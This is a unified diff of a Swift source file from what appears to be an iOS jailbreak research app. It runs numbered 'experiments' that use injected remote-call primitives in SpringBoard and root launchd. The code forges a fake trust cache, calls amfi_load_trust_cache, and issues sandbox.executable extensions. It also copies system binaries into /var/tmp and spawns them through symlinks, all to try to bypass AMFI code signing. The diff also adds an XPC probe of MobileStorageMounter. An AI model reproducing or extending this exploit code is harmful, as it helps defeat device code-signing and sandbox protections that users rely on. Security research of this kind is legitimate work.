@@ -9839,46 +9839,8 @@ struct AMFIExperimentView: View {
         let mem = sb.trojanMem
         let RTLD_DEFAULT = UInt64(bitPattern: -2)
 
-        // Step 1: Write fake trust cache via SpringBoard (SB punya filesystem access)
-        detail += "=== Step 1: Write fake trust cache ===\n"
-
-        let tcPath = "/private/var/tmp/com.apple.mobile_storage_mounter/.fake_tc"
-        let dirPathAddr = remote_alloc_str(sb, "/private/var/tmp/com.apple.mobile_storage_mounter")
-        RootExecutor.rcall(sb, "mkdir", dirPathAddr, 0o755)
-        RootExecutor.rcall(sb, "free", dirPathAddr)
-
-        let tcPathAddr = remote_alloc_str(sb, tcPath)
-        RootExecutor.rcall(sb, "unlink", tcPathAddr)
-        let fd = RootExecutor.rcall(sb, "open", tcPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
-
-        var tcFileOK = false
-        if fd != UInt64(bitPattern: -1) {
-            let tcBuf = mem + 0x800
-            // Trust cache v2: version(4) + uuid(16) + count(4) + entries
-            sb[tcBuf + 0].setValue32(2)       // version = 2
-            sb[tcBuf + 4].setValue64(0)       // uuid[0..7]
-            sb[tcBuf + 12].setValue64(0)      // uuid[8..15]
-            sb[tcBuf + 20].setValue32(1)      // count = 1
-            // Entry: fake CDHash (20 bytes) + hashType(1) + flags(1) + pad(2)
-            sb[tcBuf + 24].setValue64(0xDEADBEEFCAFEBABE)
-            sb[tcBuf + 32].setValue64(0x1337133713371337)
-            sb[tcBuf + 40].setValue32(0x0002DEAD)
-            RootExecutor.rcall(sb, "write", fd, tcBuf, 48)
-            RootExecutor.rcall(sb, "close", fd)
-            tcFileOK = true
-        }
-
-        detail += tcFileOK ? "✅ Fake TC written to \(tcPath)\n\n" : "❌ Cannot create TC file\n\n"
-
-        // Step 2: XPC connections dari SpringBoard (AMAN — bukan service manager)
-        detail += "=== Step 2: XPC connections (dari SpringBoard) ===\n"
-
-        let xpcServices = [
-            "com.apple.mobile.storage_mounter",
-            "com.apple.mobile.storage_mounter.xpc",
-            "com.apple.security.cryptexd",
-            "com.apple.mobileassetd",
-        ]
+        // Step 2: XPC connection ke MSM (minimal calls — avoid watchdog)
+        detail += "=== XPC connection (minimal) ===\n"
 
         let xpcConnect = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_create_mach_service"))
@@ -9890,163 +9852,60 @@ struct AMFIExperimentView: View {
                                               remote_alloc_str(sb, "xpc_dictionary_set_string"))
         let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                          remote_alloc_str(sb, "xpc_connection_send_message"))
-        let xpcSendWithReply = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                                  remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
 
-        detail += "xpc_connection_create: 0x\(String(format: "%llx", xpcConnect))\n"
-        detail += "xpc_connection_resume: 0x\(String(format: "%llx", xpcResume))\n"
         detail += "xpc_dictionary_create: 0x\(String(format: "%llx", xpcDictCreate))\n"
-        detail += "xpc_send_with_reply_sync: 0x\(String(format: "%llx", xpcSendWithReply))\n\n"
+        detail += "xpc_send_message: 0x\(String(format: "%llx", xpcSend))\n\n"
 
         guard xpcConnect != 0 && xpcResume != 0 && xpcDictCreate != 0 else {
             detail += "❌ XPC functions not available in SpringBoard\n"
-            RootExecutor.rcall(sb, "free", tcPathAddr)
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
         var anyConnected = false
 
-        for service in xpcServices {
-            let svcAddr = remote_alloc_str(sb, service)
+        // HANYA test service yang berhasil connect (minimize RC calls = no watchdog)
+        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+        let conn = RootExecutor.rcallAddr(sb, xpcConnect, svcAddr, 0, 0)
+        detail += "[com.apple.mobile.storage_mounter]:\n"
+        detail += "  connection: 0x\(String(format: "%llx", conn))\n"
+        RootExecutor.rcall(sb, "free", svcAddr)
 
-            // xpc_connection_create_mach_service(name, NULL, 0)
-            let conn = RootExecutor.rcallAddr(sb, xpcConnect, svcAddr, 0, 0)
-            detail += "[\(service)]:\n"
-            detail += "  connection: 0x\(String(format: "%llx", conn))\n"
+        if conn != 0 {
+            anyConnected = true
+            RootExecutor.rcallAddr(sb, xpcResume, conn)
 
-            if conn != 0 {
-                anyConnected = true
+            // Create message: xpc_dictionary_create(NULL, NULL, 0)
+            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+            detail += "  message: 0x\(String(format: "%llx", msg))\n"
 
-                // Resume connection
-                RootExecutor.rcallAddr(sb, xpcResume, conn)
+            if msg != 0 && xpcDictSetStr != 0 {
+                let keyCmd = remote_alloc_str(sb, "Command")
+                let valCmd = remote_alloc_str(sb, "LookupImage")
+                RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyCmd, valCmd)
 
-                // Create message: xpc_dictionary_create(NULL, NULL, 0)
-                let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
-                detail += "  message: 0x\(String(format: "%llx", msg))\n"
-
-                if msg != 0 && xpcDictSetStr != 0 {
-                    // Set keys for trust cache load request
-                    let keyPath = remote_alloc_str(sb, "path")
-                    let keyAction = remote_alloc_str(sb, "action")
-                    let keyCmd = remote_alloc_str(sb, "command")
-                    let valLoad = remote_alloc_str(sb, "load-trust-cache")
-                    let valPersonalize = remote_alloc_str(sb, "personalize")
-
-                    // Try multiple message formats
-                    RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyPath, tcPathAddr)
-                    RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyAction, valLoad)
-                    RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyCmd, valPersonalize)
-
-                    // Send fire-and-forget (send_with_reply_sync HANGS → respring!)
-                    // Pakai send_message saja — aman, tidak blocking
-                    if xpcSend != 0 && msg != 0 {
-                        RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
-                        // Tunggu sebentar untuk response
-                        RootExecutor.rcall(sb, "usleep", 500000) // 0.5s
-                        detail += "  Sent! (fire-and-forget, 0.5s wait)\n"
-                    } else if msg == 0 {
-                        detail += "  SKIP send — msg is NULL\n"
-                    }
-
-                    RootExecutor.rcall(sb, "free", keyPath)
-                    RootExecutor.rcall(sb, "free", keyAction)
-                    RootExecutor.rcall(sb, "free", keyCmd)
-                    RootExecutor.rcall(sb, "free", valLoad)
-                    RootExecutor.rcall(sb, "free", valPersonalize)
+                // Fire-and-forget send (NO reply sync = no hang)
+                if xpcSend != 0 {
+                    RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
+                    detail += "  Sent LookupImage command!\n"
                 }
+                RootExecutor.rcall(sb, "free", keyCmd)
+                RootExecutor.rcall(sb, "free", valCmd)
             } else {
-                detail += "  FAILED to connect\n"
-            }
-            RootExecutor.rcall(sb, "free", svcAddr)
-            detail += "\n"
-        }
-
-        // Step 3: Direct amfi_load_trust_cache dari SpringBoard
-        detail += "=== Step 3: Direct amfi_load_trust_cache (SB) ===\n"
-
-        let amfiLoadTC = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
-                                            remote_alloc_str(sb, "amfi_load_trust_cache"))
-        detail += "amfi_load_trust_cache: 0x\(String(format: "%llx", amfiLoadTC))\n"
-
-        if amfiLoadTC != 0 {
-            // Tulis TC data ke SB trojanMem
-            let tcBuf = mem + 0x800
-            sb[tcBuf + 0].setValue32(2)       // version = 2
-            sb[tcBuf + 4].setValue64(0)       // uuid[0..7]
-            sb[tcBuf + 12].setValue64(0)      // uuid[8..15]
-            sb[tcBuf + 20].setValue32(1)      // count = 1
-            sb[tcBuf + 24].setValue64(0xDEADBEEFCAFEBABE)
-            sb[tcBuf + 32].setValue64(0x1337133713371337)
-            sb[tcBuf + 40].setValue32(0x0002DEAD)
-
-            let ret = RootExecutor.rcallAddr(sb, amfiLoadTC, tcBuf, 48)
-            detail += "Direct call ret: \(Int64(bitPattern: ret))\n"
-            if ret == 0 {
-                detail += "🎉 RET=0! Trust cache mungkin loaded!\n"
-            } else {
-                detail += "Failed (expected — needs entitlement)\n"
+                detail += "  ❌ msg=NULL — xpc_dictionary_create failed\n"
             }
         } else {
-            detail += "Not found in shared cache\n"
+            detail += "  FAILED to connect\n"
         }
-
-        // Step 4: Test spawn via SpringBoard (posix_spawn)
-        detail += "\n=== Step 4: Test spawn ===\n"
-
-        let testPath = "/var/containers/Bundle/.exp100_test"
-        let testAddr = remote_alloc_str(sb, testPath)
-        let srcAddr = remote_alloc_str(sb, "/usr/libexec/amfid")
-
-        // Copy amfid ke test path
-        let srcFd = RootExecutor.rcall(sb, "open", srcAddr, UInt64(O_RDONLY), 0)
-        let dstFd = RootExecutor.rcall(sb, "open", testAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
-        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
-            let buf = mem + 0x2000
-            for _ in 0..<256 {
-                let n = RootExecutor.rcall(sb, "read", srcFd, buf, 4096)
-                if n == 0 || n == UInt64(bitPattern: -1) { break }
-                RootExecutor.rcall(sb, "write", dstFd, buf, n)
-                if n < 4096 { break }
-            }
-        }
-        RootExecutor.rcall(sb, "close", srcFd)
-        RootExecutor.rcall(sb, "close", dstFd)
-        RootExecutor.rcall(sb, "chmod", testAddr, 0o755)
-
-        let (spawnRet, spawnPid, spawnErr) = doSpawn(rc: sb, path: testPath, mem: mem)
-        detail += "posix_spawn: ret=\(spawnRet), pid=\(spawnPid), errno=\(spawnErr)\n"
-        if spawnRet == 0 && spawnPid != 0 {
-            let (sig, code) = doWait(rc: sb, pid: spawnPid, mem: mem)
-            detail += "exit: signal=\(sig), code=\(code)\n"
-            if sig != 9 {
-                detail += "\n🎉 NO SIGKILL! Trust cache load mungkin berhasil!\n"
-            } else {
-                detail += "\nSIGKILL — TC load tidak berhasil (expected)\n"
-            }
-        }
-
-        // Cleanup
-        RootExecutor.rcall(sb, "unlink", tcPathAddr)
-        RootExecutor.rcall(sb, "unlink", testAddr)
-        RootExecutor.rcall(sb, "free", tcPathAddr)
-        RootExecutor.rcall(sb, "free", testAddr)
-        RootExecutor.rcall(sb, "free", srcAddr)
 
         // Verdict
         detail += "\n=== VERDICT ===\n"
-        detail += "Context: SpringBoard (bukan launchd — no more initproc panic)\n"
+        detail += "Context: SpringBoard (minimal calls — no watchdog)\n"
         if anyConnected {
-            detail += "✅ XPC connections berhasil dari SpringBoard!\n"
-            detail += "Message sent ke services.\n"
-            detail += "Kemungkinan di-reject karena:\n"
-            detail += "  1. Trust cache tidak personalized (no Image4 signature)\n"
-            detail += "  2. SpringBoard tidak punya entitlement load-trust-cache\n"
-            detail += "  3. Message format salah (perlu reverse XPC protocol)\n\n"
-            detail += "NEXT: Reverse engineer XPC message format dari\n"
-            detail += "MobileStorageMounter binary (sudah extracted)\n"
+            detail += "✅ MSM connection berhasil!\n"
+            detail += "Message format perlu di-reverse dari MSM binary.\n"
+            detail += "Lihat Exp 105 untuk deep command probe.\n"
         } else {
-            detail += "❌ Tidak bisa connect ke XPC services dari SpringBoard.\n"
-            detail += "Services mungkin butuh specific entitlement untuk connect.\n"
+            detail += "❌ Tidak bisa connect ke MSM dari SpringBoard.\n"
         }
 
         return ExperimentResult(name: expName, success: anyConnected, detail: detail, timestamp: Date())
@@ -10060,7 +9919,31 @@ struct AMFIExperimentView: View {
     private func runExp103InstalldDeserial() { runSBExperiment(label: "Deserial", exp: expInstalldDeserial) }
     private func runExp104LockdowndOverflow() { runSBExperiment(label: "Overflow", exp: expLockdowndOverflow) }
     private func runExp105MSMXPC() { runSBExperiment(label: "MSM XPC", exp: expMSMXPC) }
-    private func runExp106SandboxExecSpawn() { runSBExperiment(label: "SBX Spawn", exp: expSandboxExecSpawn) }
+    private func runExp106SandboxExecSpawn() {
+        isRunning = true
+        runningLabel = "SBX Spawn"
+        #if !DISABLE_REMOTECALL
+        guard let sb = dspmgr.shared.sbProc else {
+            results.insert(ExperimentResult(name: "Sandbox Exec Spawn (Exp 106)", success: false,
+                detail: "No SpringBoard RC", timestamp: Date()), at: 0)
+            isRunning = false; runningLabel = ""; return
+        }
+        guard mgr.rcready else {
+            results.insert(ExperimentResult(name: "Sandbox Exec Spawn (Exp 106)", success: false,
+                detail: "No launchd RC (needed for file copy)", timestamp: Date()), at: 0)
+            isRunning = false; runningLabel = ""; return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expSandboxExecSpawn(sb: sb)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
 
     /// Helper: run experiment via SpringBoard RC on background thread
     private func runSBExperiment(label: String, exp: @escaping (RemoteCall) -> ExperimentResult) {
@@ -14509,164 +14392,136 @@ struct AMFIExperimentView: View {
     // MARK: - Exp 106: Sandbox Executable Extension + Spawn
 
     /// Exp 102 berhasil issue sandbox.executable extension.
-    /// Sekarang test: apakah spawn binary dari path yang di-extend berhasil bypass AMFI?
-    /// Strategy: issue extension → copy binary → spawn dari path tersebut.
+    /// FIXED: Pakai launchd RC untuk copy file (SB tidak bisa baca rootfs).
+    /// SB RC hanya untuk: sandbox extension + spawn (minimal calls = no watchdog).
     private func expSandboxExecSpawn(sb: RemoteCall) -> ExperimentResult {
         let expName = "Sandbox Exec Spawn (Exp 106)"
         var detail = "Experiment 106: Spawn with Sandbox Executable Extension\n"
         detail += "=========================================================\n\n"
-        detail += "Exp 102 berhasil: sandbox.executable extension issued!\n"
-        detail += "Test: apakah extension bypass AMFI code signing?\n\n"
+        detail += "FIXED: launchd copy file, SB hanya extension+spawn\n\n"
 
         let mem = sb.trojanMem
         let RTLD_DEFAULT = UInt64(bitPattern: -2)
 
-        // Step 1: Issue sandbox.executable extension
-        detail += "=== Step 1: Issue sandbox extensions ===\n"
+        // Step 1: Copy binary via LAUNCHD (bisa akses rootfs)
+        detail += "=== Step 1: Copy binary via launchd RC ===\n"
+
+        let dstPath = "/private/var/tmp/.exp106_id"
+        let srcPath = "/usr/bin/id"
+        var copyOK = false
+        var copySize: UInt64 = 0
+
+        let sem = DispatchSemaphore(value: 0)
+        root.executeAsRoot(operation: "exp106_copy") { rc in
+            let src = remote_alloc_str(rc, srcPath)
+            let dst = remote_alloc_str(rc, dstPath)
+
+            RootExecutor.rcall(rc, "unlink", dst)
+            let srcFd = RootExecutor.rcall(rc, "open", src, UInt64(O_RDONLY), 0)
+            let dstFd = RootExecutor.rcall(rc, "open", dst, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+
+            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+                let buf = rc.trojanMem + 0x2000
+                for _ in 0..<256 {
+                    let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+                    if n == 0 || n == UInt64(bitPattern: -1) { break }
+                    RootExecutor.rcall(rc, "write", dstFd, buf, n)
+                    copySize += n
+                    if n < 4096 { break }
+                }
+                copyOK = copySize > 0
+            }
+            RootExecutor.rcall(rc, "close", srcFd)
+            RootExecutor.rcall(rc, "close", dstFd)
+            RootExecutor.rcall(rc, "chmod", dst, 0o755)
+
+            // Also create symlink
+            let linkPath = remote_alloc_str(rc, "/private/var/tmp/.exp106_link")
+            RootExecutor.rcall(rc, "unlink", linkPath)
+            RootExecutor.rcall(rc, "symlink", src, linkPath)
+            RootExecutor.rcall(rc, "free", linkPath)
+
+            RootExecutor.rcall(rc, "free", src)
+            RootExecutor.rcall(rc, "free", dst)
+            sem.signal()
+            return (copyOK, "copy \(copySize)B", 0)
+        }
+        sem.wait()
+
+        detail += copyOK ? "✅ Copied \(copySize) bytes: \(srcPath) → \(dstPath)\n" :
+                           "❌ Copy failed\n"
+
+        guard copyOK else {
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Step 2: Issue sandbox extensions (SB — minimal calls)
+        detail += "\n=== Step 2: Issue sandbox.executable extension ===\n"
 
         let sbExtIssue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "sandbox_extension_issue_file"))
         let sbExtConsume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "sandbox_extension_consume"))
 
-        guard sbExtIssue != 0 && sbExtConsume != 0 else {
-            detail += "❌ sandbox_extension functions not available\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
-
-        // Issue executable extension for /private/var/tmp/
-        let extType = remote_alloc_str(sb, "com.apple.sandbox.executable")
-        let paths = [
-            "/private/var/tmp/",
-            "/private/var/containers/Bundle/",
-        ]
-
-        for path in paths {
-            let pathAddr = remote_alloc_str(sb, path)
+        if sbExtIssue != 0 && sbExtConsume != 0 {
+            let extType = remote_alloc_str(sb, "com.apple.sandbox.executable")
+            let pathAddr = remote_alloc_str(sb, "/private/var/tmp/")
             let token = RootExecutor.rcallAddr(sb, sbExtIssue, extType, pathAddr, 0)
             if token != 0 {
-                let handle = RootExecutor.rcallAddr(sb, sbExtConsume, token)
-                detail += "✅ executable ext: \(path) (handle=\(Int64(bitPattern: handle)))\n"
-            } else {
-                detail += "❌ \(path): no token\n"
+                let h = RootExecutor.rcallAddr(sb, sbExtConsume, token)
+                detail += "✅ executable ext /var/tmp/ (handle=\(Int64(bitPattern: h)))\n"
             }
+            RootExecutor.rcall(sb, "free", extType)
             RootExecutor.rcall(sb, "free", pathAddr)
         }
 
-        // Also issue read-write
-        let rwType = remote_alloc_str(sb, "com.apple.app-sandbox.read-write")
-        for path in paths {
-            let pathAddr = remote_alloc_str(sb, path)
-            let token = RootExecutor.rcallAddr(sb, sbExtIssue, rwType, pathAddr, 0)
-            if token != 0 {
-                RootExecutor.rcallAddr(sb, sbExtConsume, token)
-            }
-            RootExecutor.rcall(sb, "free", pathAddr)
-        }
-        RootExecutor.rcall(sb, "free", extType)
-        RootExecutor.rcall(sb, "free", rwType)
+        // Step 3: Spawn tests (SB — 3 calls only)
+        detail += "\n=== Step 3: Spawn tests ===\n"
 
-        // Step 2: Copy a system binary to /var/tmp (keeps CDHash)
-        detail += "\n=== Step 2: Copy system binary (keeps CDHash) ===\n"
-
-        let srcPath = "/usr/bin/id"
-        let dstPath = "/private/var/tmp/.exp106_id"
-        let srcAddr = remote_alloc_str(sb, srcPath)
-        let dstAddr = remote_alloc_str(sb, dstPath)
-
-        // Remove old
-        RootExecutor.rcall(sb, "unlink", dstAddr)
-
-        // Copy via read/write
-        let srcFd = RootExecutor.rcall(sb, "open", srcAddr, UInt64(O_RDONLY), 0)
-        let dstFd = RootExecutor.rcall(sb, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
-
-        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
-            let buf = mem + 0x2000
-            var totalCopied: UInt64 = 0
-            for _ in 0..<256 {
-                let n = RootExecutor.rcall(sb, "read", srcFd, buf, 4096)
-                if n == 0 || n == UInt64(bitPattern: -1) { break }
-                RootExecutor.rcall(sb, "write", dstFd, buf, n)
-                totalCopied += n
-                if n < 4096 { break }
-            }
-            detail += "Copied \(totalCopied) bytes: \(srcPath) → \(dstPath)\n"
-        } else {
-            detail += "❌ Cannot open src(\(srcFd)) or dst(\(dstFd))\n"
-        }
-        RootExecutor.rcall(sb, "close", srcFd)
-        RootExecutor.rcall(sb, "close", dstFd)
-        RootExecutor.rcall(sb, "chmod", dstAddr, 0o755)
-
-        // Step 3: Spawn from /var/tmp WITH sandbox extension active
-        detail += "\n=== Step 3: Spawn with extension ===\n"
-
+        // Test A: spawn copied binary
         let (ret1, pid1, err1) = doSpawn(rc: sb, path: dstPath, mem: mem)
-        detail += "posix_spawn(\(dstPath)): ret=\(ret1), pid=\(pid1), errno=\(err1)\n"
-
+        detail += "A) spawn(copy): ret=\(ret1), pid=\(pid1), errno=\(err1)\n"
         if ret1 == 0 && pid1 != 0 {
             let (sig, code) = doWait(rc: sb, pid: pid1, mem: mem)
-            detail += "exit: signal=\(sig), code=\(code)\n"
-            if sig != 9 {
-                detail += "\n🎉🎉🎉 NO SIGKILL! Binary executed from /var/tmp!\n"
-                detail += "Sandbox executable extension BYPASSES spawn restriction!\n"
-            } else {
-                detail += "SIGKILL — AMFI still kills (CDHash mismatch after copy)\n"
-            }
-        } else if ret1 == 0 && pid1 == 0 {
-            detail += "ret=0 but pid=0 — spawn failed silently\n"
+            detail += "   exit: signal=\(sig), code=\(code)\n"
+            if sig != 9 { detail += "   🎉 NO SIGKILL!\n" }
         }
 
-        // Step 4: Try symlink approach (keeps original CDHash)
-        detail += "\n=== Step 4: Symlink spawn (preserves CDHash) ===\n"
-
-        let symlinkPath = "/private/var/tmp/.exp106_id_link"
-        let symlinkAddr = remote_alloc_str(sb, symlinkPath)
-        RootExecutor.rcall(sb, "unlink", symlinkAddr)
-        RootExecutor.rcall(sb, "symlink", srcAddr, symlinkAddr)
-
-        let (ret2, pid2, err2) = doSpawn(rc: sb, path: symlinkPath, mem: mem)
-        detail += "posix_spawn(symlink→\(srcPath)): ret=\(ret2), pid=\(pid2), errno=\(err2)\n"
-
+        // Test B: spawn via symlink (preserves CDHash)
+        let (ret2, pid2, err2) = doSpawn(rc: sb, path: "/private/var/tmp/.exp106_link", mem: mem)
+        detail += "B) spawn(symlink→id): ret=\(ret2), pid=\(pid2), errno=\(err2)\n"
         if ret2 == 0 && pid2 != 0 {
             let (sig2, code2) = doWait(rc: sb, pid: pid2, mem: mem)
-            detail += "exit: signal=\(sig2), code=\(code2)\n"
-            if sig2 != 9 {
-                detail += "\n🎉 Symlink spawn SUCCESS with sandbox extension!\n"
-            }
+            detail += "   exit: signal=\(sig2), code=\(code2)\n"
+            if sig2 != 9 { detail += "   🎉 SYMLINK SPAWN SUCCESS!\n" }
         }
 
-        // Step 5: Try spawn /usr/bin/id directly (should always work)
-        detail += "\n=== Step 5: Direct spawn /usr/bin/id (baseline) ===\n"
-
-        let (ret3, pid3, err3) = doSpawn(rc: sb, path: srcPath, mem: mem)
-        detail += "posix_spawn(\(srcPath)): ret=\(ret3), pid=\(pid3), errno=\(err3)\n"
-
+        // Test C: spawn /usr/bin/id directly from SB
+        let (ret3, pid3, err3) = doSpawn(rc: sb, path: "/usr/bin/id", mem: mem)
+        detail += "C) spawn(/usr/bin/id): ret=\(ret3), pid=\(pid3), errno=\(err3)\n"
         if ret3 == 0 && pid3 != 0 {
             let (sig3, code3) = doWait(rc: sb, pid: pid3, mem: mem)
-            detail += "exit: signal=\(sig3), code=\(code3)\n"
+            detail += "   exit: signal=\(sig3), code=\(code3)\n"
         }
-
-        // Cleanup
-        RootExecutor.rcall(sb, "unlink", dstAddr)
-        RootExecutor.rcall(sb, "unlink", symlinkAddr)
-        RootExecutor.rcall(sb, "free", srcAddr)
-        RootExecutor.rcall(sb, "free", dstAddr)
-        RootExecutor.rcall(sb, "free", symlinkAddr)
 
         // Verdict
         detail += "\n=== VERDICT ===\n"
-        let anySpawnWorked = (ret1 == 0 && pid1 != 0) || (ret2 == 0 && pid2 != 0)
-        if anySpawnWorked {
-            detail += "✅ Spawn berhasil dari /var/tmp dengan sandbox extension!\n"
-            detail += "Cek signal — jika bukan SIGKILL = AMFI bypass!\n"
+        let anySuccess = (ret1 == 0 && pid1 != 0) || (ret2 == 0 && pid2 != 0) || (ret3 == 0 && pid3 != 0)
+        if anySuccess {
+            detail += "✅ Spawn berhasil! Cek signal di atas.\n"
         } else {
-            detail += "❌ Spawn gagal — sandbox extension tidak cukup untuk bypass\n"
-            detail += "AMFI check CDHash di kernel level (bukan sandbox level)\n"
+            detail += "Spawn results:\n"
+            detail += "  ret=8 = ENOEXEC (file bukan executable valid)\n"
+            detail += "  ret=2 = ENOENT (file tidak ditemukan)\n"
+            detail += "  ret=13 = EACCES (permission denied)\n"
+            detail += "  ret=1 = EPERM (operation not permitted)\n"
+            detail += "  pid=0 = proses tidak dibuat\n\n"
+            detail += "Sandbox extension = filesystem access saja.\n"
+            detail += "AMFI CDHash check = kernel level, bukan sandbox.\n"
+            detail += "Extension tidak bypass code signing.\n"
         }
 
-        return ExperimentResult(name: expName, success: anySpawnWorked, detail: detail, timestamp: Date())
+        return ExperimentResult(name: expName, success: anySuccess, detail: detail, timestamp: Date())
     }
 
     
